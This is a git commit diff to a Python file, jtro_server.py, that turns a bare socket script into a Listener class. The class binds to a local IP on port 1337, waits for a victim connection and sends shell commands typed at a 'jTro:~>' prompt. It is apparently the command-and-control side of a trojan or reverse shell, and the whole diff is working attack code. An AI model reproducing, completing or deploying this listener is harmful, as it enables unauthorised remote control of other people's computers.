b082a855c842a91f287fa1cf340c3331d54308d2
jakiiii <me.jaki@outlook.com>
2019-02-13 15:24:59 +0600

    create a jTro server class

--- jtro_server.py
+++ jtro_server.py
@@ -2,10 +2,26 @@
 import socket
 
 
-lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-lst.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-lst.bind(("192.168.31.207", 1337))
-lst.listen(5)
-print("[+] Waiting for incoming connection.")
-lst.accept()
-print("[+] Connection has been established.")
+class Listener:
+    def __init__(self, ip, port):
+        lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        lst.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        lst.bind((ip, port))
+        lst.listen(5)
+        print("[+] Waiting for incoming connection.")
+        self.c, a = lst.accept()
+        print("[+] Connection established from " + str(a))
+
+    def execute(self, cmd):
+        self.c.send(cmd.encode('utf-8'))
+        return self.c.recv(1024).decode('utf-8')
+
+    def run(self):
+        while True:
+            cmd = input("jTro:~> ")
+            res = self.execute(cmd)
+            print(res)
+
+
+jTro_Listener = Listener("192.168.31.207", 1337)
+jTro_Listener.run()
